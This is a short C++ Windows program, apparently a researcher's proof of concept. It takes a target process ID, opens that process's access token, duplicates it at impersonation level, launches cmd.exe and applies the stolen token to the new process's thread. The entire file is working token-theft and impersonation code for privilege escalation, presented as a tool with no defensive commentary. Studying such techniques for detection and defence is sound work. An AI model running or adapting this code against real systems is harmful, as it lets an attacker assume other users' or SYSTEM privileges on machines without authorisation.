//Author: Jonathan Johnson (@jsecurity101)

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
#include <fstream>

int main(int argc, char* argv[])
{
    DWORD PID = atoi(argv[1]);

    HANDLE hToken, hDuplicate, hProcess = NULL;

    TCHAR username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;


    hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID);
    if (!hProcess)
    {
        std::cout << "[-] OpenProcess Failed (" << GetLastError() << ").\n";
    }
    else
    {
        std::cout << "[*] Handle to PID: " << PID << " aquired via OpenProcess!" << ".\n";
        if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken))
        {
            std::cout << "[-] OpenProcessToken Failed (" << GetLastError() << ").\n";
        }
        else
        {
            std::cout << "[*] OpenProcessToken passed!" << ".\n";

            if (!DuplicateToken(hToken, SecurityImpersonation, &hDuplicate))
            {
                std::cout << "[-] DuplicateToken Failed (" << GetLastError() << ").\n";
            }
            else
            {
                STARTUPINFO si = {};
                si.cb = sizeof si;

                PROCESS_INFORMATION pi = {};
                if (!CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
                    printf("CreateProcess failed (%d).\n", GetLastError());
                }
                else {
                    printf("[*] CreateProcess passed!\n");
                    if (!SetThreadToken(&pi.hThread, hDuplicate))
                    {
                        std::cout << "[-] Impersonation Failed (" << GetLastError() << ").\n";
                    }
                    else
                    {
                        printf("[*] Impersoantion Passed!\n");
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);

                    }
                }

                

            }
            CloseHandle(hDuplicate);
            CloseHandle(hToken);
            CloseHandle(hProcess);


        }
    }
    return 0;
}